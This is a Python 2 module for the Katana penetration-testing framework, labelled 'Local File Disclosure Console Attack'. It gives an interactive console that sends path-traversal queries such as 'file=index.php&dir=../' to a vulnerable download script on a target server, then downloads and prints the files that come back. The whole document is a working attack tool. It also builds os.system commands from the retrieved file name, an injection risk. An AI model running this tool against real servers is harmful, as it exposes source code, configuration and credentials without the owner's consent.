# This module requires katana framework 
# https://github.com/RedToor/Katana
# :-:-:-:-:-:-:-:-:-:-:-:-:-: #
# Katana Core                 #
from core.design import *     #
from core.Setting import *    #
from core import Errors       #
from core import getFunction  #
import sys                    #
Message=DESIGN()              #
# :-:-:-:-:-:-:-:-:-:-:-:-:-: #
# Libraries                   #
import httplib,urllib         #
import urllib2			      #
import os                     #  
# :-:-:-:-:-:-:-:-:-:-:-:-:-: #

# INFORMATION MODULE
def initialize():
	initialize.Author             ="RedToor"
	initialize.Version            ="1.1"
	initialize.Despcription       ="Local File Disclosure Console Attack."
	initialize.CodeName           ="web/clt.lfd"
	initialize.DateCreation       ="14/01/2016"      
	initialize.LastModification   ="24/03/2016"

	# DEFAULT VARIABLES             VALUE                NAME        RQ     DESCRIPTION
	initialize.DEFAULT_VARIABLE   =[[LOCAL_IP          , "target" , "yes" , "IP or DNS"]]      #[0][0]
	initialize.DEFAULT_VARIABLE  +=[[HTTP_PORT         , "port"   , "no"  , "Service port"]]   #[1][0]
	initialize.DEFAULT_VARIABLE  +=[["/download.php"   , "patch"  , "yes" , "Vulnerable file"]] #[2][0]
initialize()
# END INFORMATION MODULE

# MAIN FUNCTION
def main(run):
	try:
		# HEAD MODULE
		if run:	actions=raw_input(Message.prompt(initialize.CodeName))
		else  : actions="run"
		if   getFunction.KatanaCheckActionShowOptions(actions):getFunction.ShowOptions(initialize.DEFAULT_VARIABLE)
		elif getFunction.KatanaCheckActionSetValue(actions)   :initialize.DEFAULT_VARIABLE=getFunction.UpdateValue(actions,initialize.DEFAULT_VARIABLE)
		elif getFunction.KatanaCheckActionisBack(actions)     :return
		# END HEAD MODULE
		elif getFunction.runModule(actions):
			Message.run()
			# CODE MODULE    ############################################################################################
			try:
				getFunction.live(initialize.DEFAULT_VARIABLE[0][0],initialize.DEFAULT_VARIABLE[1][0])
				if True:
					connection = httplib.HTTPConnection(initialize.DEFAULT_VARIABLE[0][0],initialize.DEFAULT_VARIABLE[1][0])
					connection.request("GET",initialize.DEFAULT_VARIABLE[2][0])
					response = connection.getresponse()
					if response.status == 200:
						print " "+Suf+" File response correctly."
						Message.space()
						print "\n "+Hlp+" LFD Console help\n"
						print "  ----------------------------------------------------"
						print "  |"+colors[12]+"Command | Description|           Examples        |"+colors[0]
						print "  ---------------------------------------------------"
						print "  |   get  | Query data | get file=index.php&dir=../ |" 
						print "  ---------------------------------------------------"
						Message.space()
						command=0
						while command!="exit":
							command=raw_input(Message.Client_prompt("LFD"))
							if command[:3] == "get":
								submit=command[4:]
								try:
									url = "http://"+initialize.DEFAULT_VARIABLE[0][0]+":"+initialize.DEFAULT_VARIABLE[1][0]+initialize.DEFAULT_VARIABLE[2][0]+"?"+submit
									file_name = url.split('/')[-1]
									u = urllib2.urlopen(url)
									f = open("tmp/"+file_name, 'wb')
									meta = u.info()
									try:		
										file_size = int(meta.getheaders("Content-Length")[0])
										if file_size != 0:
											print " "+Alr+" Request "+url
											print " "+Alr+" Downloading %s Bytes: %s" % (file_name, file_size)
											file_size_dl = 0
											block_sz = 8192
											while True:
												buffer = u.read(block_sz)
												if not buffer:
													break
												file_size_dl += len(buffer)
												f.write(buffer)
												status = r"%10d  [%3.2f%%]" % (file_size_dl, file_size_dl * 100. / file_size)
												status = status + chr(8)*(len(status)+1)
												print " "+Suf+" Completed "+status
											    	f.close()
												print " \n -------------------------------- File "+file_name+" Size: "+str(file_size)+" \n"
												os.system("cat 'tmp/"+file_name+"' -b -v ")
												os.system("rm 'tmp/"+file_name+"'")
												print " \n -------------------------------- File "+file_name+" Size: "+str(file_size)+" \n"
										else:
											print " "+War+" File empy or no exist."
									except:
										Errors.Errors(event=sys.exc_info(), info=url)
								except:
									Errors.Errors(event=sys.exc_info(), info=defaulthost+":"+defaultport)
					else:
						print " "+Bad+" File Not response correctly."
						Message.space()
			except:
				Errors.Errors(event=sys.exc_info(), info=initialize.DEFAULT_VARIABLE[0][0]+":"+initialize.DEFAULT_VARIABLE[1][0])
			# END CODE MODULE ############################################################################################
		else:
			getFunction.KatanaCheckActionGlobalCommands(actions)
	# ERROR GENERAL
	except:
		Errors.Errors(event=sys.exc_info(), info=sys.exc_traceback.tb_lineno)
	# END ERROR GENERAL
	main(True)
# END MAIN FUNCTION

# LINKER FUNCTION
def run(target,port,files):
	initialize.DEFAULT_VARIABLE [0][0] = target
	initialize.DEFAULT_VARIABLE [1][0] = port
	initialize.DEFAULT_VARIABLE [2][0] = files
	main(False)
# END LINKER FUNCTION